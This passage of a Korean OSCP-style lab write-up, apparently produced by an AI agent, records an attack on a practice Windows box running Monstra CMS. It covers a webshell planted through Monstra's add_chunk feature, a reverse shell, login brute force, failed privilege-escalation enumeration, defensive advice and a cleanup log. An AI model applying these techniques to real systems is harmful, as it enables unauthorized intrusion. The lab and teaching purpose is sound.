| `/blog/storage/database/users.table.xml` 직접 읽기 | 403. Monstra 가 `storage/.htaccess` 에 `Deny from all` 을 넣어 출하한다 |
| 경로 우회 (`//`, `/./`, 대소문자) | 전부 403 |
| 로그인/비밀번호재설정의 XPath 인젝션 | 직후 동등검사(`$user['login'] == $_POST['login']`, `$user['hash'] == $_GET['hash']`)가 막는다 |
| XAMPP `/php-cgi/php-cgi.exe` (CVE-2024-4577) | 엔드포인트는 **있다** — `/php-cgi/php.exe` 는 403 인데 `php-cgi.exe` 만 500 을 준다(XAMPP 의 `<Files "php-cgi.exe">Require all granted` 구성 그대로). 하지만 `%ADd ...`·`-d ...` 둘 다 500 에서 안 움직였다. 이 취약점의 best-fit 문자 매핑은 CJK 코드페이지에서만 성립한다고 알려져 있고, 이 박스는 영문 로케일로 보인다 — **`[가정]`**, 코드페이지를 직접 확인하지는 못했다 |
| 웹 이미지 exif / strings | 전부 무소득 |
| UDP top-100 | 열린 포트 없음 |

### 6. 권한상승에서 막혔다 — 후보를 다 태우고도 못 올라갔다

발판 이후 세션을 넘겨받아 약 50분을 권한상승에만 썼고 **실패했다.** 여기가 이 노트에서 제일 값싸게 배울 수 있는 부분이다.

**가장 유망했던 1순위가 가장 먼저 죽었다.** `INTERACTIVE` + `CONSOLE LOGON` 관측에서 "자동 로그온이 켜져 있을 것이고 그러면 평문 비번이 레지스트리에 있을 것"까지는 추론이 맞았다 — `AutoAdminLogon` 은 실제로 `1` 이었다. **틀린 것은 그다음 반 걸음이었다.** 자동 로그온 비번은 `netplwiz`/`Autologon` 으로 설정하면 레지스트리가 아니라 LSA Secret 으로 간다. 그리고 `AutoLogonSID` 를 보니 대상이 Administrator 도 아닌 **mike 본인**이었다. 추론이 맞아도 **끝까지 맞아야 크리덴셜이 나온다**는 걸 비싸게 배웠다.

**「없다」를 확인하는 데 드는 시간을 얕봤다.** `Get-ChildItem -Path C:\ -Include *.kdbx,unattend.xml,... -Recurse` 한 줄이 **7분 넘게** 돌았다. 게다가 이 리버스셸은 Nishang 계열이라 `iex $data 2>&1 | Out-String` 로 **명령이 끝나야 출력을 한 번에 보낸다** — 진행 상황이 안 보여서 죽었는지 도는지 구분이 안 된다. 전체 디스크 재귀는 마지막에 돌리거나, 애초에 `C:\Users`·`C:\Windows\Panther` 처럼 범위를 좁혀서 던졌어야 했다.

**셸 다루다 두 번 사고를 낼 뻔했다.** `tmux send-keys` 에 `Enter` 를 빼먹고 깨진 명령을 보냈다. 순간 "이거 실행되면 셸이 죽나" 싶었는데, **tmux 페인은 pty 라 tty 라인 디시플린이 canonical 모드로 동작한다** — 개행이 오기 전까지 입력은 로컬 라인 버퍼에 머물고 `nc` 에게조차 안 넘어간다. 그래서 `C-u`(kill line) 한 번으로 **타겟에 한 바이트도 안 보내고** 지웠다. `C-c` 를 눌렀으면 셸이 죽었을 수도 있다. 살아 있는 셸에서 당황했을 때 **먼저 그 입력이 어디까지 갔는지부터 판정**해야 한다.

또 하나 — bash 로 `ssh ... 'tmux send-keys "... $_.PathName ..."'` 를 짤 때 **`$_` 가 원격 bash 에서 확장된다.** 큰따옴표 안이라 로컬은 안 건드려도 원격이 먹는다. `\$_` 로 이스케이프해야 하고, 그걸 놓쳐 PowerShell 필터가 조용히 무력화돼 **서비스 200개가 통째로 쏟아졌다**(필터가 없는 것과 같은 결과인데 에러는 안 난다 — 제일 나쁜 실패 방식이다). 결국 **명령을 파일에 쓰고 `tmux send-keys "$(cat cmd.txt)" Enter` 로 보내는 방식**으로 바꿨다(`~/PG/Monster/send.sh`). 인용 계층이 셋(로컬 bash → 원격 bash → PowerShell)일 때는 처음부터 이렇게 가는 게 맞다.

**어떻게 배제했는지가 다음 사람에게 남는 것이다.** §4-2 의 표 16줄은 전부 "빈손"이지만, 그게 곧 "이 박스의 권한상승은 이 16개가 아니다"라는 정보다. 다시 붙는다면 **§4-4** 부터다 — 쓰기 가능한 `httpd.exe`·`mysqld.exe` 는 확보돼 있고 트리거 한 조각만 비어 있다. 그 조각의 후보로 §4-3 의 `notepad.exe` 23개를 먼저 볼 생각이다(**[가정]**, 연결은 못 지었다).

**그리고 이 절을 쓰면서 제일 비쌌던 오답은 MySQL 이었다**(§4-2-b). 배너에서 XAMPP 를 맞게 특정하고도 "그러면 MySQL 이 돌겠지"를 공짜로 얹었고, 실제로는 서비스도 프로세스도 소켓도 없었으며, 그 위에 **Monstra 가 애초에 DB 를 안 쓰는 플랫파일 CMS** 였다. 소스가 손에 있었는데 `storage/database/*.table.xml` 을 보고도 그 함의를 안 읽었다. §6-2 의 캡차 삽질과 **같은 실패**다 — 소스를 읽을 수 있는데 두드리기부터 했다.

**그리고 이게 진짜 교훈이다.** `SeImpersonate` 가 없고, 서비스도 스케줄 작업도 자격증명 파일도 없고, SAM 도 못 읽는다면 — 남은 건 대개 **내가 아직 열거하지 못한 영역**이다. mike 권한으로는 `C:\Users\Administrator` 안이 통째로 안 보인다(§5). Linux 쪽 [[PwnLab]] 에서 `find / -perm -4000` 이 `/home/*` 의 `drwxr-x---` 때문에 커스텀 SUID 를 놓친 것과 **정확히 같은 함정**이고, 나는 이번에도 그 벽 앞에서 멈췄다.

**열거 체크리스트에 `StartName` 이 빠져 있었다.** §4-2 의 16줄은 winPEAS 가 훑는 항목을 손으로 하나씩 때린 것인데, 서비스 목록을 `Name,State,PathName` 로만 찍고 **"어느 계정으로 도는가(`StartName`)"** 를 안 봤다. Windows 박스에서 서비스를 볼 때는 `Get-CimInstance Win32_Service | select Name,StartName,State,PathName` 가 기본형이다 — 경로만 보면 "쓰기 가능한가"밖에 못 묻고, 계정을 같이 봐야 **"바꿔봐야 누가 실행하는가"**를 물을 수 있다. 이 교훈을 `~/PG/_lib/harvest.ps1` 에 박아 다음 Windows 박스부터 자동으로 찍게 했다.

**[가정]** 다만 이걸 초반에 봤어도 **이 박스는 안 풀렸을 것이다.** `StartName` 을 찍었어도 XAMPP 관련 서비스는 애초에 목록에 없다(§4-2-b 의 `Win32_Service` 빈 결과·`sc.exe qc mysql` → 1060). 나중에 이 절을 "`StartName` 을 빼먹어서 XAMPP 를 놓쳤다"로 정리했었는데, 그건 **틀린 복기**다. 놓친 XAMPP 서비스라는 것이 존재하지 않았다.

### 7. `best64.rule` 이 Kali 7.1.2 에는 없다 — 사전이 0줄이 되는데 조용하다

발판 단계(§2)에서 사전을 만들 때 겪은 함정이지만, **시험장에서 이유를 영영 못 찾을 종류**라 여기 따로 박아둔다.

hashcat 룰로 cewl 단어를 확장하려고 `best64.rule` 을 쓰려 했는데, Kali 의 hashcat 7.1.2 에는 그 파일이 **없다**. 대신 `best66.rule` 이 있다. 튜토리얼과 치트시트가 거의 전부 `best64.rule` 을 쓰니 이름을 의심할 이유가 없다.

```
ls /usr/share/hashcat/rules/ | grep -i best
best66.rule
```

**hashcat 이 조용한 게 아니다 — 내가 목소리를 다른 파이프로 흘려보낸 것이다.** 이 절은 원래 "hashcat 이 에러를 안 낸다"고 적혀 있었는데, 검증하면서 Kali 에서 직접 때려보니 사실이 아니었다.

```
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule w1.txt > o.txt 2> e.txt
exit=255
stdout lines: 0
stderr: [/usr/share/hashcat/rules/best64.rule: No such file or directory]
```

에러 문구도 있고 종료 코드도 **255** 다. 그런데 실제로 쓴 형태는 이랬다.

```
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule words.txt | sort -u > words_b64.txt
```

여기서 세 겹으로 소리가 죽는다. (1) 에러는 **stderr** 로 나가니 `> words_b64.txt` 리다이렉트를 안 타고, (2) 파이프라인의 종료 코드는 **마지막 명령 `sort` 의 0** 이라 `&&` 체인도 `set -e` 도 안 걸리며, (3) `sort` 는 빈 입력을 정상 처리해서 **0바이트 파일이 성공적으로 만들어진다.** 원격 tmux 안에서 돌리면 stderr 마저 다른 페인으로 흩어진다. `~/PG/Monster/words_b64.txt` 가 지금도 **0바이트**로 남아 있다.

`best66.rule` 로 바꿔서 14,579개 후보를 만들었고 거기서 `wazowski` 가 나왔다(§2).

**반사신경 두 개.** 룰 파일 이름은 배포판마다 다르니 쓰기 전에 `ls /usr/share/hashcat/rules/` 를 한 번 본다. 그리고 **사전을 만들었으면 다음 명령에 넘기기 전에 `wc -l` 을 친다.** 0줄이면 룰 파일명부터 의심한다. 도구가 실패를 알려주지 않는 게 아니라 **파이프라인이 그 알림을 버리는 것**이므로, 파이프 끝의 파일 크기를 직접 보는 것 말고 안전한 방법이 없다.

### 8. 박스가 열거 도중 내려갔다 — 실패가 아니라 중단이다

**여기서 작업이 끝난 이유는 기술적 실패가 아니라 운영 결정이다.** §4-4 의 트리거를 찾던 중, 다른 박스(Flimsy)를 켜면서 **포털의 동시 1대 슬롯 규칙**에 걸려 Monster 인스턴스가 정지·리버트됐다. 이 노트를 쓰는 쪽의 판단이었고 박스 쪽 방어나 조작 실수가 아니다. `pkill` 도 쓰지 않았다(광범위 `pkill` 은 이 프로젝트에서 tmux 서버를 통째로 날린 전례가 있어 금지다).

**"시도해서 실패했다"와 "시도 중에 끊겼다"는 다음 사람에게 전혀 다른 정보라** 구분해서 적는다. §4-2 의 16종은 전자, §4-4 는 후자다.

`harvest.ps1` 을 타겟에서 돌리던 중이었다. tmux 서버(리스너 세션 포함)가 먼저 사라졌고, 곧이어 타겟 192.168.248.180 이 80·443·445·3389·135 전부 `No route to host` 가 됐다.

```
ping -c 2 -W 2 192.168.248.180
2 packets transmitted, 0 received, 100% packet loss

ping -c 1 -W 2 192.168.45.1
1 packets transmitted, 1 received, 0% packet loss
rtt min/avg/max/mdev = 83.481/83.481/83.481/0.000 ms
```

`tun0` 는 살아 있고(`192.168.45.207`) VPN 게이트웨이 `192.168.45.1` 은 83ms 로 응답한다 — **VPN 문제가 아니라 랩 측 박스 티어다운**이다. CLAUDE.md 가 경고하는 "실패 원인을 계층별로 분리하라"의 실사례다: 리버스셸이 끊긴 순간 방화벽이나 내 실수를 의심할 수 있었지만, 게이트웨이 핑 한 번이 원인을 박스 소멸로 확정해 줬다. 리버트로 **타겟 디스크가 초기화돼 `harv_out.txt` 도 함께 사라졌다.** 리버스셸 재수립(Monstra `admin:wazowski` → `add_chunk`)을 시도했으나 이미 박스가 내려간 뒤라 `No route to host` 로 실패했다.

이 교훈을 반영해 열거 스크립트를 하나 만들어 뒀다 — `~/PG/_lib/harvest.ps1`(4,082바이트). 이번에 빠뜨렸던 **서비스 실행 계정(`StartName`)** 이 들어 있다. 타겟 전송 후 MD5 일치와 실행 개시까지는 확인했지만 **완주도 출력 회수도 못 했다 — 박스가 그 도중에 내려갔다. 아직 미검증 스크립트다.**

**교훈** — 살아 있는 인스턴스는 유한하다. `whoami /all` 로 특권을 확인한 그 순간에 **가장 값싼 후보부터가 아니라 가장 그럴듯한 후보부터** 때렸어야 했다. 그리고 전체 디스크 재귀 검색처럼 **7분씩 잡아먹는 명령을 중반에 던진 것**이 실제로 비쌌다(§6-6) — 그 7분 뒤에 온 출력은 스크롤백 저장 시점을 넘겨서 **파일로 남지도 못했다**(§4-2 의 「페인만」 4줄). 인스턴스가 언제든 사라질 수 있다면 **긴 명령은 결과를 파일로 떨어뜨리고 던져라.**

## 7. OSCP 시험 관점

1. **무명 CMS 를 만나면 순서가 정해져 있다.** ① `generator` 메타·푸터로 버전 확정 → ② `searchsploit` → ③ **"인증 필요"가 붙었는지 확인** → ④ 붙었으면 문제는 익스플로잇이 아니라 크리덴셜이다. 이 박스는 ③에서 방향이 갈렸다.
2. **사용자 열거가 공짜인 CMS 는 브루트포스를 현실적으로 만든다.** `/users`, `/author/1`, `?author=1`(WordPress), REST API 를 먼저 본다.
3. **cewl 은 장식이 아니다.** 정답 `wazowski` 는 10k 상용 사전에 없고 사이트 제목에 있었다. `cewl -d 3 -m 4` → `hashcat --stdout -r best66.rule` → hydra 를 한 세트로 외워둔다.
4. **브루트포스를 시작하기 전에 서버 처리량을 재라.** 병렬 curl 200개 한 줄이면 나온다. 여기는 70 req/s 였고, 그 숫자를 먼저 알았으면 rockyou 를 시도조차 안 했을 것이다. **손절 판단은 감이 아니라 산수다.**
5. **로그인 잠금을 만나면 그게 서버측인지 클라이언트측인지 먼저 봐라.** 쿠키/localStorage 기반이면 잠금이 아니다. 반대로 **내 수동 시도가 그 잠금에 걸려 정답을 놓칠 수 있다**(§6-1).
6. **웹셸은 발판이지 목적지가 아니다.** `?cmd=` 가 도는 순간 할 일은 플래그 `type` 이 아니라 리버스셸이다. 시험 규정상 웹셸로 읽은 플래그는 0점이다.
7. **쓰기 가능한 경로·바이너리를 찾았으면 흥분하기 전에 실행 주체를 찍어라.** `icacls` 가 `(M)` 을 보여줘도 그걸 SYSTEM 이 실행하지 않으면 승리 조건이 아니다. 순서는 `icacls` → `Get-CimInstance Win32_Service | select Name,StartName,PathName` → `Get-WmiObject Win32_Process ... GetOwner()` 다. Windows 박스에서 서비스를 볼 때 `StartName` 을 빼면 절반만 본 것이다.
8. **번들 스택의 구성요소가 돈다고 가정하지 마라.** XAMPP·LAMP·WAMP 배너는 **무엇이 번들됐는지**의 정보지 **무엇이 돌고 있는지**가 아니다. 확인은 세 줄 — 서비스(`sc.exe qc`), 프로세스(`tasklist | findstr`), 소켓(`netstat -ano | findstr <포트>`). 그리고 한 층 더: **앱이 그 DB 를 쓰기는 하는가.** 플랫파일 CMS(Monstra·Grav·Kirby·Flextype)면 DB 축은 통째로 없다.
9. **긴 명령은 결과를 파일로 떨어뜨리고 던져라.** 랩 인스턴스는 예고 없이 리버트된다. 전체 디스크 재귀 검색 7분의 결과가 스크롤백 저장 시점을 넘겨서 **아예 남지 않았다**(§4-2 의 「페인만」 4줄).
10. **시간 배분** — 정찰~Monstra 특정 5분, 크리덴셜 확보까지 27분, RCE~셸 8분. 크리덴셜 구간이 전체의 3분의 2였고, 그중 **15분이 캡차 삽질**이었다. 소스가 손에 있을 때는 **엔드포인트를 두드리기 전에 그 엔드포인트로 뭘 할 수 있는지부터 읽어라.**

## 8. 방어 관점

- **Monstra 3.0.4 는 2014년이 마지막 릴리스다.** 유지보수되지 않는 CMS를 인터넷에 노출한 것이 근본 원인이다. 교체가 답이고, 못 하면 최소한 관리자 패널을 IP 로 제한한다.
- **로그인 잠금을 서버측 카운터로 옮긴다.** 쿠키에 상태를 두면 잠금이 아니다. 계정별/IP별 카운터 + 지수 백오프.
- **사용자 목록을 공개하지 않는다.** `/blog/users` 는 인증 뒤로 옮기거나 없앤다.
- **비밀번호를 사이트 콘텐츠에서 파생하지 않는다.** `wazowski` 는 페이지 제목이었다.
- **업로드 확장자를 블랙리스트로 막지 않는다.** 화이트리스트로 뒤집고, 업로드 디렉터리에서 스크립트 핸들러를 끈다(`php_admin_flag engine off` 또는 `RemoveHandler`).
- **웹서버를 대화형 로그온 세션에서 돌리지 않는다.** XAMPP Control Panel 을 로그온 시 띄우는 구성은 웹 RCE 를 사용자 세션 장악으로 직결시킨다. 전용 서비스 계정으로 서비스 등록한다.
- **`C:\` 루트에 애플리케이션을 통째로 깔지 않는다.** `C:\xampp` 는 `Authenticated Users:(M)` 를 상속받아 `httpd.exe`·`mysqld.exe` 가 일반 사용자에게 쓰기 가능했다(§4-2-c). 여기서는 실행 주체가 mike 라 상승으로 이어지지 않았을 뿐, **서비스로 등록만 했어도 즉시 SYSTEM 이었다.** `C:\Program Files` 밑에 설치하거나 설치 후 ACL 을 명시적으로 잠근다.
- **자동 로그온을 쓰지 않는다.** `AutoAdminLogon=1` 은 비밀번호를 레지스트리 평문이나 LSA Secret 에 남기고, 세션이 항상 살아 있어 사용자 컨텍스트 공격면이 상시 노출된다.

## 9. 참고 자료

- EDB-52038 — Monstra CMS 3.0.4 RCE (themes → add_chunk). `/usr/share/exploitdb/exploits/php/webapps/52038.py`
- EDB-48479 / CVE-2017-18048 — filesmanager `.php7` 업로드. **이 박스에서는 업로드 기능이 죽어 있어 못 썼다**
- EDB-49949 / CVE-2018-6383 — filesmanager `.pht`·`.phar` 업로드. 같은 이유로 못 썼다
- Monstra 소스 — `https://github.com/monstra-cms/monstra` (판단 근거로 클론해 대조)

## 남긴 흔적

확인한 것만 적는다.

전체 확인 원문은 `~/PG/Monster/traces_confirmed.log` 에 있다.

**되돌린 것 (삭제 전후를 둘 다 찍어 확인했다):**

```
===BEFORE_DEL===
 Directory of C:\xampp\htdocs\blog\public\themes\default

08/20/2026  04:39 AM                94 mon9x.chunk.php
               1 File(s)             94 bytes
               0 Dir(s)   6,906,793,984 bytes free
===DELETING===
===AFTER_DEL===
 Directory of C:\xampp\htdocs\blog\public\themes\default

===TEMPCHECK===
 Directory of C:\Windows\Temp


 Directory of C:\Windows\Temp

===DONE===
```

- 타겟 `mon9x.chunk.php` — **삭제 확인 완료.** Monstra 는 chunk 를 파일로 저장하므로 파일을 지우면 chunk 자체가 사라진다
- 타겟 `C:\Windows\Temp` — `*.ps1`·`*.exe` **없음**(원래 남긴 게 없었다). 위 `===TEMPCHECK===` 블록이 그 확인이다
- Kali `/etc/hosts` 의 `192.168.248.180 monster.pg` — **원복 확인 완료**. `sudo sed -i '/monster\.pg/d' /etc/hosts` 후 `grep` 이 무매치(exit 1). 원본은 `~/PG/Monster/hosts.before_revert` 에 보존. 다른 박스 항목은 건드리지 않았다
- Kali 리스너 — `ss -lntp` 에 443/80/53 잔존 리스너 **없음**(광범위 `pkill` 미사용)

**박스가 리버트돼 타겟 흔적은 전부 소멸했다.** 아래 타겟 항목은 리버트 이전 시점의 기록이며, 지금은 디스크 초기화로 존재하지 않는다.

- 타겟에서 `mike` 로 돌던 PowerShell 리버스셸 (tcp/443) — 박스와 함께 소멸
- 두 번째로 심으려던 `mon9y.chunk.php` — **박스가 이미 내려가 심기지 못했다**(`No route to host`). 타겟에 생성되지 않았다
- 리버트 전 남아 있던 것: Apache 브루트포스 로그 약 **44,000건**(10k 런 20,000 + cewl 런 약 24,000), `admin` Monstra 로그인 기록, 업로드 실패 3건의 POST 로그, Windows 이벤트 로그. **어느 것도 지우지 않았고**, 지금은 리버트로 전부 사라졌다

  44,000 이라는 숫자는 자각하고 적는다. **한 시간 안에 한 IP 에서 같은 엔드포인트로 4만 건의 실패 POST** 는 어떤 로그 상관분석에도 걸린다. 실전 관여였다면 그 자체로 작전 실패이고, 시험 보고서에도 이 규모를 그대로 써야 한다. **지우지 않은 것이 규율대로다** — 로그 삭제는 흔적을 더 남기고 되돌릴 수 없다. 「남긴 흔적」이 요구하는 것은 지우는 것이 아니라 **내가 무엇을 남겼는지 알고 적는 것**이다
- `harvest.ps1` 을 `%TEMP%` 에 올려 실행 중이었다 — 박스와 함께 소멸

**Kali 쪽 — 내가 정리한 것 (확인 완료):**

- tmux `mon_ls443b`(박스 다운 후 재수립을 위해 띄운 내 리스너) — **세션 이름으로 종료 확인.** `ss -lntp` 에 443 리스너 없음
- base64 전송용 임시 청크 `hc_*`·`h.b64` — 삭제
- 산출물은 보존: `try1~try8_*.log`, `readd.py`, `exploit52038.py`, `~/PG/_lib/harvest.ps1`, `traces_confirmed.log`
- **건드리지 않은 것**: 다른 박스 소유 tmux 세션 `fli_gob`·`fli_nmap`, 리버트 전 잠깐 보였던 root 소유 `nc -lvnp 80`(내 것이 아님). **광범위 `pkill` 미사용**

**확인하지 않은 것 (「없음」이 아니라 「안 봤음」):**

- 리버트 전 `harvest.ps1` 이 남긴 `%TEMP%\harv_out.txt`·`harvest.ps1` — 박스 소멸로 회수·정리 모두 불가. 어차피 리버트로 사라졌다
- 권한상승 열거 중 만든 `w.tmp` 쓰기 테스트 파일 — 생성 직후 `Remove-Item` 으로 지우게 짰으나 사후 확인 전에 박스가 내려갔다

## 관련 노트

- [[Jacko]] — 같은 "1개만 먹고 권한상승 미완" 상태. 둘 다 발판 이후 열거 기록이 얇다
- [[Squid]] · [[Hub]] · [[Levram]] — 버전 판정은 독립 근거 2개
- [[Hawat]] · [[Exfiltrated]] · [[Squid]] — 인용이 깨지면 인코딩으로 도망간다(여기서는 base64 + `--data-urlencode`)
- [[Fowsniff]] — 사이트/OSINT 에서 만든 사전으로 크리덴셜을 뚫은 같은 부류
- [[_STATUS]]
